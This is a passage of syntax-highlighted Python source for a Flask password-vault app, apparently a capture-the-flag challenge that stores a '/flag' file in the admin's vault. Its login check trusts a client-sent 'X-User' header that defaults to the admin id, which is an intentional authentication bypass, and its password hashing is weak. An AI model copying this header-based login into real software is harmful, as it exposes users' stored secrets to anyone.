</span></span><span class=line><span class=cl>    <span class=n>created_at</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>Column</span><span class=p>(</span><span class=n>db</span><span class=o>.</span><span class=n>DateTime</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=n>datetime</span><span class=o>.</span><span class=n>utcnow</span><span class=p>,</span> <span class=n>nullable</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hash_password</span><span class=p>(</span><span class=n>password</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>salt</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>salt</span> <span class=o>+</span> <span class=n>password</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>50</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>data</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>data</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>verify_password</span><span class=p>(</span><span class=n>password</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>salt_b64</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>digest</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bool</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>salt</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>salt_b64</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hash_password</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>salt</span><span class=p>)</span> <span class=o>==</span> <span class=n>digest</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_salt</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>secrets</span><span class=o>.</span><span class=n>token_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_app</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=n>Flask</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SECRET_KEY&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>secrets</span><span class=o>.</span><span class=n>token_hex</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SQLALCHEMY_DATABASE_URI&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s1>&#39;DATABASE_URL&#39;</span><span class=p>,</span> <span class=s1>&#39;sqlite:///vault.db&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SIGN_SERVER&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s1>&#39;SIGN_SERVER&#39;</span><span class=p>,</span> <span class=s1>&#39;http://127.0.0.1:4444/sign&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>fernet_key</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s1>&#39;FERNET_KEY&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>fernet_key</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=s1>&#39;Missing FERNET_KEY environment variable. Generate one with `python -c &#34;from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())&#34;`.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;FERNET_KEY&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>fernet_key</span>
</span></span><span class=line><span class=cl>    <span class=n>db</span><span class=o>.</span><span class=n>init_app</span><span class=p>(</span><span class=n>app</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fernet</span> <span class=o>=</span> <span class=n>Fernet</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;FERNET_KEY&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>app</span><span class=o>.</span><span class=n>app_context</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>db</span><span class=o>.</span><span class=n>create_all</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>User</span><span class=o>.</span><span class=n>query</span><span class=o>.</span><span class=n>first</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=n>salt</span> <span class=o>=</span> <span class=n>secrets</span><span class=o>.</span><span class=n>token_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>password</span> <span class=o>=</span> <span class=n>secrets</span><span class=o>.</span><span class=n>token_bytes</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>password_hash</span> <span class=o>=</span> <span class=n>hash_password</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>salt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>user</span> <span class=o>=</span> <span class=n>User</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=nb>id</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>username</span><span class=o>=</span><span class=s1>&#39;admin&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>password_hash</span><span class=o>=</span><span class=n>password_hash</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>salt</span><span class=o>=</span><span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>salt</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>db</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>user</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>db</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>commit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>flagEntry</span> <span class=o>=</span> <span class=n>VaultEntry</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>user_id</span><span class=o>=</span><span class=n>user</span><span class=o>.</span><span class=n>id</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>label</span><span class=o>=</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>login</span><span class=o>=</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>password_encrypted</span><span class=o>=</span><span class=n>fernet</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>flag</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                <span class=n>notes</span><span class=o>=</span><span class=s1>&#39;This is the flag entry.&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>db</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>flagEntry</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>db</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>commit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>login_required</span><span class=p>(</span><span class=n>view_func</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nd>@wraps</span><span class=p>(</span><span class=n>view_func</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>def</span> <span class=nf>wrapped</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=p>,</span> <span class=o>**</span><span class=n>kwargs</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>uid</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>headers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;X-User&#39;</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>uid</span> <span class=o>==</span> <span class=s1>&#39;anonymous&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Please sign in first.&#39;</span><span class=p>,</span> <span class=s1>&#39;warning&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>uid_int</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=p>(</span><span class=ne>TypeError</span><span class=p>,</span> <span class=ne>ValueError</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Invalid session. Please sign in again.&#39;</span><span class=p>,</span> <span class=s1>&#39;warning&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>user</span> <span class=o>=</span> <span class=n>User</span><span class=o>.</span><span class=n>query</span><span class=o>.</span><span class=n>filter_by</span><span class=p>(</span><span class=nb>id</span><span class=o>=</span><span class=n>uid_int</span><span class=p>)</span><span class=o>.</span><span class=n>first</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>user</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;User not found. Please sign in again.&#39;</span><span class=p>,</span> <span class=s1>&#39;warning&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>g</span><span class=o>.</span><span class=n>current_user</span> <span class=o>=</span> <span class=n>user</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>view_func</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=p>,</span> <span class=o>**</span><span class=n>kwargs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>wrapped</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>uid</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>headers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;X-User&#39;</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>uid</span> <span class=ow>or</span> <span class=n>uid</span> <span class=o>==</span> <span class=s1>&#39;anonymous&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;dashboard&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/register&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>register</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>username</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>password</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;password&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>confirm_password</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;confirm_password&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>username</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>password</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Username and password are required.&#39;</span><span class=p>,</span> <span class=s1>&#39;danger&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;register.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>password</span> <span class=o>!=</span> <span class=n>confirm_password</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Passwords do not match.&#39;</span><span class=p>,</span> <span class=s1>&#39;danger&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;register.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>salt</span> <span class=o>=</span> <span class=n>generate_salt</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>password_hash</span> <span class=o>=</span> <span class=n>hash_password</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>salt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>user</span> <span class=o>=</span> <span class=n>User</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>username</span><span class=o>=</span><span class=n>username</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>password_hash</span><span class=o>=</span><span class=n>password_hash</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>salt</span><span class=o>=</span><span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>salt</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>db</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>user</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>db</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>commit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=n>IntegrityError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>db</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>rollback</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Username already exists. Please choose another.&#39;</span><span class=p>,</span> <span class=s1>&#39;warning&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;register.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Registration successful. Please sign in.&#39;</span><span class=p>,</span> <span class=s1>&#39;success&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;register.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>login</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>username</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>password</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;password&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>user</span> <span class=o>=</span> <span class=n>User</span><span class=o>.</span><span class=n>query</span><span class=o>.</span><span class=n>filter_by</span><span class=p>(</span><span class=n>username</span><span class=o>=</span><span class=n>username</span><span class=p>)</span><span class=o>.</span><span class=n>first</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>user</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>verify_password</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>user</span><span class=o>.</span><span class=n>salt</span><span class=p>,</span> <span class=n>user</span><span class=o>.</span><span class=n>password_hash</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Invalid username or password.&#39;</span><span class=p>,</span> <span class=s1>&#39;danger&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;login.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SIGN_SERVER&#39;</span><span class=p>],</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;uid&#39;</span><span class=p>:</span> <span class=n>user</span><span class=o>.</span><span class=n>id</span><span class=p>},</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Unable to reach the authentication server. Please try again later.&#39;</span><span class=p>,</span> <span class=s1>&#39;danger&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;login.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=n>token</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>response</span> <span class=o>=</span> <span class=n>make_response</span><span class=p>(</span><span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;dashboard&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>            <span class=n>response</span><span class=o>.</span><span class=n>set_cookie</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;token&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>token</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>httponly</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>secure</span><span class=o>=</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;SESSION_COOKIE_SECURE&#39;</span><span class=p>,</span> <span class=kc>False</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                <span class=n>samesite</span><span class=o>=</span><span class=s1>&#39;Lax&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>max_age</span><span class=o>=</span><span class=mi>12</span> <span class=o>*</span> <span class=mi>3600</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>response</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;login.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/logout&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>logout</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>make_response</span><span class=p>(</span><span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span><span class=o>.</span><span class=n>delete_cookie</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Signed out.&#39;</span><span class=p>,</span> <span class=s1>&#39;info&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>response</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/dashboard&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nd>@login_required</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>dashboard</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>user</span> <span class=o>=</span> <span class=n>g</span><span class=o>.</span><span class=n>current_user</span>
</span></span><span class=line><span class=cl>        <span class=n>entries</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;id&#39;</span><span class=p>:</span> <span class=n>entry</span><span class=o>.</span><span class=n>id</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;label&#39;</span><span class=p>:</span> <span class=n>entry</span><span class=o>.</span><span class=n>label</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;login&#39;</span><span class=p>:</span> <span class=n>entry</span><span class=o>.</span><span class=n>login</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;password&#39;</span><span class=p>:</span> <span class=n>fernet</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>entry</span><span class=o>.</span><span class=n>password_encrypted</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;notes&#39;</span><span class=p>:</span> <span class=n>entry</span><span class=o>.</span><span class=n>notes</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;created_at&#39;</span><span class=p>:</span> <span class=n>entry</span><span class=o>.</span><span class=n>created_at</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>entry</span> <span class=ow>in</span> <span class=n>user</span><span class=o>.</span><span class=n>vault_entries</span>
</span></span><span class=line><span class=cl>        <span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;dashboard.html&#39;</span><span class=p>,</span> <span class=n>username</span><span class=o>=</span><span class=n>user</span><span class=o>.</span><span class=n>username</span><span class=p>,</span> <span class=n>entries</span><span class=o>=</span><span class=n>entries</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/passwords/new&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=nd>@login_required</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>create_password</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>user</span> <span class=o>=</span> <span class=n>g</span><span class=o>.</span><span class=n>current_user</span>
